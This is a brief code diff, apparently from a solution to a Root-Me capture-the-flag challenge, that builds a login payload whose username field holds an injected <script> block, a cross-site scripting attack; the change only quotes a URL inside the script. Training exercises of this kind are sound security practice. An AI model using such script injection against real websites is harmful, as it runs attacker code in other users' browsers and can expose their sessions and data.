@@ -2,7 +2,7 @@ let url = "http://challenge01.root-me.org:58003/login"
 
 let nullOpener = window.opener == null ? "yes":"non"
 let payload={
-    username :`<script>const url = ${url};
+    username :`<script>const url = "${url}";
 
     const data = {
         nullOpener: "${nullOpener}",
